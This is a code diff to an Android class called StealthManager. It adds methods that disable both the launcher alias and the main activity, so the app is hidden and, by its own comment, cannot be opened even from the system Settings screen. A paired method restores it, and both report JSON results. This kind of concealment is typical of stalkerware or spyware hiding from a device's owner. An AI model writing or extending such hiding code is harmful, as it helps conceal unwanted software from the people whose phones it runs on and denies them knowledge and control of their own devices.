@@ -53,6 +53,90 @@ public class StealthManager {
                                  context.getPackageName() + ".LauncherAlias");
     }
 
+    private ComponentName mainActivityComponent() {
+        return new ComponentName(context.getPackageName(),
+                                 context.getPackageName() + ".MainActivity");
+    }
+
+    /**
+     * Fully hide app - disable both launcher alias AND MainActivity.
+     * Makes app completely unopenable even from Settings > App Info > Open.
+     */
+    public JSONObject fullyHideApp() {
+        JSONObject result = new JSONObject();
+        
+        try {
+            PackageManager pm = context.getPackageManager();
+
+            pm.setComponentEnabledSetting(
+                launcherAliasComponent(),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            );
+            
+            pm.setComponentEnabledSetting(
+                mainActivityComponent(),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            );
+            
+            context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
+                .edit().putBoolean(KEY_ICON_HIDDEN, true).apply();
+
+            result.put("success", true);
+            result.put("message", "App fully hidden - not openable from anywhere");
+            
+        } catch (Exception e) {
+            try {
+                result.put("success", false);
+                result.put("error", e.getMessage());
+            } catch (JSONException ex) {
+                ex.printStackTrace();
+            }
+        }
+        
+        return result;
+    }
+
+    /**
+     * Restore app from full hide - re-enable MainActivity and launcher alias.
+     */
+    public JSONObject fullyShowApp() {
+        JSONObject result = new JSONObject();
+        
+        try {
+            PackageManager pm = context.getPackageManager();
+
+            pm.setComponentEnabledSetting(
+                mainActivityComponent(),
+                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                PackageManager.DONT_KILL_APP
+            );
+            
+            pm.setComponentEnabledSetting(
+                launcherAliasComponent(),
+                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                PackageManager.DONT_KILL_APP
+            );
+            
+            context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
+                .edit().putBoolean(KEY_ICON_HIDDEN, false).apply();
+
+            result.put("success", true);
+            result.put("message", "App fully restored");
+            
+        } catch (Exception e) {
+            try {
+                result.put("success", false);
+                result.put("error", e.getMessage());
+            } catch (JSONException ex) {
+                ex.printStackTrace();
+            }
+        }
+        
+        return result;
+    }
+
     /**
      * Hide app icon from launcher.
      * Disables only the activity-alias so the icon disappears from the drawer,
